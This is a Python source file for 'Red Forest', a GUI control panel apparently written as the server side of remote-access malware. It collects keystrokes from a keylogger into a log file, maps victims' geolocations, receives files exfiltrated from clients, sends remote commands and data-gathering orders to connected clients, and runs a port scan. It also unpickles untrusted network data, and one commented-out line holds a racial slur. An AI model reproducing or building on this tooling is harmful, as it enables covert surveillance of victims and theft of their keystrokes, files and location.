from PIL import Image, ImageTk
import customtkinter
import tkinter
import threading
import socket
import tkintermapview
import subprocess
import time
import pickle
import os
from datetime import datetime
from tkinter import messagebox
import playsound


class App(customtkinter.CTk):
    # Important lists
    SERVER_SOCKETS = []
    CLIENT_IP = []
    USER_GEOLOCATIONS = []

    # Socket IP adresses and PORTS
    filename_transfer_SOIP = "127.0.0.2"
    filename_transfer_SOPORT = 65433
    file_transfer_SOIP = "127.0.0.4"
    file_transfer_SOPORT = 1930
    cli_SOIP = "127.0.0.1"
    cli_SOPORT = 12345
    keylog_SOIP = "127.0.0.89"
    keylog_SOPORT = 65230
    gather_SOIP = "127.0.0.69"
    gather_SOPORT = 42069
    genSoc_SOIP = "127.0.0.1"
    genSoc_SOPORT = 46969

    # Important Variables
    sep = ":***:"
    stop_music = False


    def __init__(self):
        super().__init__()
               
        self.title("Red Forest")
        self.geometry("1050x500")

        # create 2x2 grid system
        self.grid_rowconfigure((0, 3), weight=1)
        self.grid_columnconfigure((0, 3), weight=1)
        ############################################################################################
        #                                        UI design                                         #
        ############################################################################################
        
        #! Backround image (red_forest)
        self.bg_image = customtkinter.CTkImage(light_image=Image.open("Data//red_forest.png"),
                                  dark_image=Image.open("Data//red_forest.png"),
                                  size=(300, 500))

        self.button = customtkinter.CTkButton(self, image=self.bg_image,
                                              border_width= 0,
                                              corner_radius=0,
                                              bg_color="blue",
                                              hover_color="black",
                                              fg_color="black",
                                              text=None,)
        self.button.grid(row=0, column=0, sticky="n")

        #! Right Frame: Live Keylogger update
        self.frame = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=600)
        self.frame.grid(row=0, column=3, sticky="ne")


         # Text Box 
        self.textbox = customtkinter.CTkTextbox(master=self.frame, 
                                                width=160, 
                                                height=500,
                                                activate_scrollbars = False,
                                                corner_radius=0)
        self.textbox.grid(row=0, column=2)
        
        # create CTk scrollbar
        self.ctk_textbox_scrollbar = customtkinter.CTkScrollbar(self.frame,width=17, height=500, command=self.textbox.yview)
        self.ctk_textbox_scrollbar.grid(row=0, column=3,sticky="nw")
        
        # connect textbox scroll event to CTk scrollbar
        self.textbox.configure(yscrollcommand=self.ctk_textbox_scrollbar.set)
        
        
        #! Left Frame: Navigation Buttons
        self.frame1 = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=500)
        self.frame1.grid(row=0, column=0,)
        

        # Buttons and the Logo
        self.my_image = customtkinter.CTkImage(light_image=Image.open("Data//new.png"),
                                  dark_image=Image.open("Data//new.png"),
                                  size=(120, 120))

        self.button = customtkinter.CTkButton(self.frame1, image=self.my_image,bg_color="black",hover_color="black",fg_color="black",text=None,)
        self.button.grid(row=0, column=0, pady =10,padx =10,sticky="n")

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            text="Killswitch",
                                            bg_color="red", 
                                            fg_color="black",
                                            hover_color="red",
                                            command=self.killswitch)
        self.button.grid(row=1, column=0, pady =10,sticky="n", padx=10)
      
        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            command=self.startPortScan,
                                            fg_color="#a10505", 
                                            hover_color="black", 
                                            text="Port Scan")
        self.button.grid(row=2, column=0, pady =10,sticky="n", padx=10)

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            command=self.openMapLevel,
                                            fg_color="#a10505", 
                                            hover_color="black", 
                                            text="Geolocation")
        self.button.grid(row=3, column=0, pady =10,sticky="n", padx=10)     

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                            command=self.showFiles,
                                            fg_color="#a10505",
                                            hover_color="black",  
                                            text="Files")
        self.button.grid(row=4, column=0, pady =10, sticky="n", padx=10)

        self.button = customtkinter.CTkButton(master=self.frame1, 
                                             command=self.startGathering, 
                                             fg_color="#a10505",
                                             hover_color="black",  
                                             text="Show Clients")
        self.button.grid(row=5,column=0,pady=10,sticky="n", padx=10)
        
        #! Center Frame: Main content/command line
        self.frame2 = customtkinter.CTkFrame(master=self,
                               width=500,
                               height=400,
                               corner_radius=0)
        self.frame2.grid(row=0, column=2, sticky="s")
        
        # BIG_Textbox, big_textbox, big
        self.m_textbox = customtkinter.CTkTextbox(self.frame2, width=565, height=400,corner_radius=0,)
        self.m_textbox.grid(row=1, column=1, sticky="n")

        self.entry = customtkinter.CTkEntry(master=self.frame2,
                               placeholder_text=" ",
                               width=320,
                               height=50,
                               border_width=2,
                               corner_radius=10)
        self.entry.grid(row=2, column=1, sticky="w", pady = 25, padx = 5)

        self.button = customtkinter.CTkButton(master=self.frame2,height=25,
                                              fg_color="#620606",
                                              hover_color="black",  
                                              command=self.send_to_client,text="Submit")
        self.button.grid(row=2, column=1, padx = 10, pady = 10, sticky = "e")
                
        ###########################################################################################
        #                                        System                                           #
        ###########################################################################################
        def play_backround_sound():
            global mus_t
            def play():
                playsound.playsound("Data/playlist for silly goofsters.mp3", False)
                print("aqdad")

            mus_t = threading.Thread(target=play)
            mus_t.daemon = True
            mus_t.start()
        
            
        play_backround_sound()    
        
        #! CLI SOCKET SEGMENT
        def start_CLI_socket():
            t3 = threading.Thread(target=create_CLI_socket)
            t3.daemon = True
            t3.start()

        def create_CLI_socket():
            global cli
            print("Created CLI socket")
            while True:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as Ip_info: # This will get the Clients IP and Port so that the CLI can connect
                        Ip_info.bind(("127.0.0.1", 44404))
                        Ip_info.listen(1)
                        conn, addr = Ip_info.accept()
                        with conn:
                            print("CONNECTEDDDDDDD")
                            while True: 
                                msg = conn.recv(128).decode("utf-8")
                                if msg:
                                    try:
                                        HOST = msg.split(";")[0]  
                                        PORT = int(msg.split(";")[1])
                                        self.m_textbox.insert("0.0", f"\nClient IP:{HOST}\nClient PORT:{PORT}\n")
                                        time.sleep(0.5)
                                        conn.send(bytes("continue", 'utf-8'))
                                        break
                                    except: print(f"Host: {HOST}\nPort: {PORT}")
                        
                break  
            
            while True:
                try:    
                    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    cli.connect((HOST,PORT))
                    print("CLI_Success: Connected to CLI client.")
                    self.m_textbox.insert("0.0", f"\nCLI connection succesfull\n")  
                    # Add the cli socket only once to the list
                    if cli not in self.SERVER_SOCKETS:
                        self.SERVER_SOCKETS.append(cli) 
                    break
                except Exception as e: print(f"Thrown Exception CLI: {e}")
                time.sleep(3)

            #? Checks if the client is still connected
            while True:
                print("Checking client status.")
                try: cli.send(bytes("TEST DATA", "utf-8")) #? Send data to see if Client is online
                except Exception as e: 
                    if "[WinError 10056] A connect request was made on an already connected socket" in str(e): pass
                    else: #? If not try to reconnect untill the client goes online
                        try: 
                            cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cli.connect((HOST,PORT))
                            print("CLI_Success: Reconnected with the client.")
                            self.m_textbox.insert("0.0", f"\nClient to server connection re-established.\n") 
                            if cli not in self.SERVER_SOCKETS: self.SERVER_SOCKETS.append(cli) 
                        except: 
                            self.m_textbox.insert("0.0", f"\nERROR: Client disconnected!\n") 
                            print(f"CLI Reconnection error: {e}")
                time.sleep(3)
        start_CLI_socket()    

        #? KEYLOGGER SOCKET
        def startSocket():
            print("\nServer started the keylog socket.")
            t2 = threading.Thread(target=createKeylogSocket)
            t2.daemon = True
            t2.start()

        def createKeylogSocket():
            HOST = self.keylog_SOIP
            PORT = self.keylog_SOPORT 
            global k_file
            with open("Keylogger_data.txt", "a") as k_file: # Create the Keylogger_data.txt file
                k_file.write(f"LOG: {str(datetime.now())}\n") # Insert the current time and date to the text file
                while True:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        self.SERVER_SOCKETS.append(s)
                        # Continue
                        s.bind((HOST, PORT))
                        s.listen()
                        conn, addr = s.accept()
                        self.CLIENT_IP.append(addr)
                        self.m_textbox.insert("0.0", f"\nKeylogger operational.\n")  
                        with conn:
                            print(f"KEYLOGGER: Connected by {addr}")
                            self.USER_GEOLOCATIONS.append(conn.recv(64).decode("utf-8"))
                            self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
                            while True:
                                try: 
                                    data = conn.recv(1024).decode("utf-8") 
                                    self.textbox.insert("0.0", f"{data}\n")
                                    k_file.write(f"{data}\n")
                                except: 
                                    print("\nKeylogger connection reset.\n"); 
                                    k_file.close()
                                    break 
                                time.sleep(0.0001)
        startSocket()
        
        #? FILE_TRANSFER SOCKET
        def start_file_name_socket():
            print("\nDICT_TRANSFER: Server started.")
            t4 = threading.Thread(target=create_file_name_socket)
            t4.daemon = True
            t4.start()
            

        def create_file_name_socket():
            HOST = self.filename_transfer_SOIP  # Standard loopback interface address (localhost)
            PORT = self.filename_transfer_SOPORT  # Port to listen on (non-privileged ports are > 1023)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Add the server socket to a list
                self.SERVER_SOCKETS.append(s)
                # Continue
                s.bind((HOST, PORT))
                print("DICT_TRANSFER: Listening for clients.\n")
                s.listen()
                conn, addr = s.accept()
                self.CLIENT_IP.append(addr)
                # Accept the pickle list and print it
                with conn:
                    print(f"DICT_TRANSFER: Connected by {addr}")
                    data = conn.recv(1024)
                    data = pickle.loads(data)
                    print(data)
      
        def start_file_transfer_socket():
            print("\nFILE_TRANSFER: Server started.")
            t5 = threading.Thread(target=create_file_transfer_socket)
            t5.daemon = True
            t5.start()
            

        def create_file_transfer_socket():
            HOST = self.file_transfer_SOIP
            PORT = self.file_transfer_SOPORT

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Create the Socket
                s.bind((HOST, PORT))
                s.listen()
                self.SERVER_SOCKETS.append(s)
                #print("I AM LISTENING")
                self.m_textbox.insert("0.0", f"\nFile Transfer online.\n")  
                while True:
                    print("I AM ACCEPTING")
                    conn, addr = s.accept()
                    self.CLIENT_IP.append(addr)
                    # Variables for the message while loop
                    msg_size = 77
                    msg = b''
                    while True:
                        # TODO Make the recv wait untill all 77 bytes are recieved                
                        while len(msg) < msg_size:
                            msg = conn.recv(77).decode("utf-8") # ! 64b(File bytes) + 13b(HEADER) 
                            #print(f"{len(msg)}, {msg}\n")
                        msg = msg.replace(" ","")
                        if msg:
                            
                            try:
                                cmd = msg.split(f"{self.sep}")[0]
                                data = msg.split(f"{self.sep}")[1]
                                if msg ==  "FINISH:***:Completed": 
                                    print(msg)
                                    print(cmd)
                                    print(data)
                                
                                #data = "".join()
                            except Exception as e: 
                                print(f"\nCMD:{cmd}")
                                print(f"DATA:{data}") 
                                print(f"Error:{e}\n")

                            match cmd:
                                case "FILENAME_TEXT":
                                    print(f"\nCreated TXT file: {msg}")
                                    new_file = open(f"Files/{data}", "w")
                                    self.m_textbox.insert("0.0", f"{msg}\n")
                                    cmd = ""

                                case "TXT_DATA":
                                    #print(f"\nWriting to TXT file: {data}")
                                    filesize = int(data)
                                    while True:
                                        if filesize < -3000: break
                                        try: msg = conn.recv(64).decode("utf-8")
                                        except Exception as e: print(str(e))
                                        if filesize < 0 and "::END_OF_THE_SOCKET::" in msg: 
                                            cmd = ""
                                            msg = ""
                                            print("Recieved the Trailer.")
                                            new_file.close()     
                                            self.m_textbox.insert("0.0", f"\nFile transfered!\n")   
                                            break
                                        new_file.write(msg)
                                        filesize = filesize-64
                                        #new_file.write("NIGGA")
                                        print("---------------------")
                                        print("FILESIZE", filesize)
                                        print("MSG", msg)
                                        print("---------------------")
       
                                case "FINISH":
                                    print("\n")
                                    print(f"\nClosing the file: {msg}")
                                    #textbox.insert("0.0", f"\nAll files transfered!\n")
                                    #new_file.close()
                                    cmd = ""
         
        start_file_name_socket()
        start_file_transfer_socket()

        #? GMS- General Message Socket
        def startGeneralSocket():
            t_gms = threading.Thread(target=createGeneralSocket)
            t_gms.daemon = True
            t_gms.start()

        def createGeneralSocket():
            HOST = self.genSoc_SOIP
            PORT = self.genSoc_SOPORT 
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as gms_socket:
                    self.SERVER_SOCKETS.append(gms_socket)
                    self.m_textbox.insert("0.0", f"\nGMS client operational.\n") 
                    while True:
                        # Wait for client connection
                        gms_socket.bind((HOST, PORT))
                        gms_socket.listen()
                        conn, addr = gms_socket.accept()
                        with conn:
                            self.CLIENT_IP.append(addr)
                            self.m_textbox.insert("0.0", f"\nGMS client connected.\n")  
                            while True:
                                msg = conn.recv(128).decode("utf-8")
                                if msg:
                                    self.m_textbox.insert("0.0", f"\nGMS Client message recieved: {msg}\n")
        startGeneralSocket()
                        
    ############################################################################################
    #                                        Functions                                         #
    ############################################################################################
    def send_to_client(self):
        global cli
        data = self.entry.get()
        try: cli.send(bytes(f"{data}", "utf-8"))
        except: pass
        print(f"Sent: {data}, to Client")
        self.m_textbox.insert("0.0", f"\nCLI Packet: {data}\n")  
            
    def showFiles(self):
        subprocess.Popen('explorer "Files"')         
    
    def killswitch(self):
        sockets_to_close = list(self.SERVER_SOCKETS) # Make a copy of the list to avoid changing it while iterating over it
        for i in sockets_to_close:
            print(type(i))
        for soc in sockets_to_close:
            try:
                soc.shutdown(socket.SHUT_RDWR) # Shutdown both the read and write sides of the socket
                soc.close()
                print(f"Closing down socket: {soc}")
            except OSError:
                print(f"Error closing socket: {soc}")
        self.SERVER_SOCKETS.clear() # Remove all sockets from the list
        print("\n!!! KILLSWITCH: Successfully shutdown all connections. !!!\n")


    def openScanner(self):
        import portscaner
        root_tk = customtkinter.CTkToplevel(self)
        root_tk.geometry("300x200")
        root_tk.title("Open Ports")    
        label = customtkinter.CTkLabel(master=root_tk, text=f"Loading Data.")
        label.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)

        self.m_textbox.insert("0.0", "\nPort scanner active!\n")  
        print(str(self.SERVER_SOCKETS))
        portscaner.scan_ports("127.0.0.1", 70)
        
        # GUI
        label1 = customtkinter.CTkLabel(master=root_tk, text=f"Open Ports: {portscaner.OPEN_PORTS}")
        label1.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
        
        print(portscaner.OPEN_PORTS)
        self.m_textbox.insert("0.0", "\nPort scanner deactivated.\n")  

    def startPortScan(self):
        portThread = threading.Thread(target=self.openScanner)
        portThread.daemon = True
        portThread.start()
    
    def openMapLevel(self):
        # create tkinter window
        def create_geoTopLevel():
            root_tk = customtkinter.CTkToplevel(self)
            root_tk.geometry("600x450")
            root_tk.title("Location mapping.")

            # create map widget
            map_widget = tkintermapview.TkinterMapView(root_tk, width=800, height=600, corner_radius=0)
            map_widget.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
            self.m_textbox.insert("0.0", f"\nGeolocation active.\n")  
            try:
                map_widget.set_address(f"{self.USER_GEOLOCATIONS}")
            except:
                map_widget.set_address("colosseo, rome, italy")
                self.m_textbox.insert("0.0", f"\nGeolocation module lacks coordinates. Default location will be used.\n")  

        geoThread = threading.Thread(target=create_geoTopLevel)
        geoThread.daemon = True
        geoThread.start()

    def startGathering(self):
        th = threading.Thread(target=self.Gathering)
        th.daemon=True
        th.start() 

    def Gathering(self):
        print("Starting1")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind((self.gather_SOIP, self.gather_SOPORT))
            window = customtkinter.CTkToplevel(self)
            window.geometry("600x400")
            our_box = customtkinter.CTkTextbox(window, 200, 200, bg_color='red')
            our_box.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
            window.title("Client List")
            cli.send('run -gatherData'.encode("utf-8"))
            sock.listen()
            conn, _ = sock.accept()
            print("Accepted")
            infos = []
            while True:
                data = conn.recv(1024)
                infos.append(data.decode('utf-8'))
                if len(infos) > 3:
                    break
            for info in infos:
                our_box.insert(customtkinter.END, f"{info}\n")

# Before closing save the keylogger data
# TODO: Before closing send a server closing message to the client afterwards cleanly kill all active sockets
def on_closing():
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        k_file.close()
        app.killswitch()
        app.destroy()

# Run dze up
app = App()
app.protocol("WM_DELETE_WINDOW", on_closing)
app.mainloop()
